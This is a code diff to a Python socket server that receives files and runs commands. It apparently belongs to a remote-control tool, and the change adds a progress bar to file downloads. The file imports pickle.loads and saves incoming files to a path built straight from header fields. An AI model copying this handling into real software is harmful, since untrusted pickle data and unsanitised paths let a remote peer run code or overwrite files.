@@ -10,6 +10,7 @@ from getpass import getuser
 from pickle import loads
 from datetime import datetime
 from pathlib import Path
+from rich.progress import BarColumn, Progress, TimeRemainingColumn
 from rich import print as printr
 from os import system, uname
 
@@ -51,11 +52,19 @@ class Server(object):
             receivedFile.write(content)
 
     def receiveFile(self, connection, header):
-        received = b''
-        while len(received) < header['bytes']:
-            received += connection.recv(header['bytes'])
-        
-        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', received)
+        progress = Progress("[progress.description][green]{task.description}", BarColumn(), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn())
+
+        with progress:
+            task = progress.add_task(f"Downloading {header['namefile']}", total=header['bytes'])
+
+            file = received = b''
+
+            while len(file) < header['bytes']:
+                received = connection.recv(header['bytes'])
+                file += received
+                progress.update(task, advance=len(received))
+
+        self.saveReceivedFile(f'./{header["path"]}/{header["namefile"]}{header["extension"]}', file)
 
     def download(self, args):
         self.checkFolders()
@@ -129,7 +138,7 @@ class Server(object):
 
     def showLastCommand(self, args):
         printr(self.lastCommand)
-    
+
     def internalcommands(self, args):
         printr(''.join(f'  {command}\n' for command in self.allCommands().keys() if self.allCommands()[command]['local']))
 
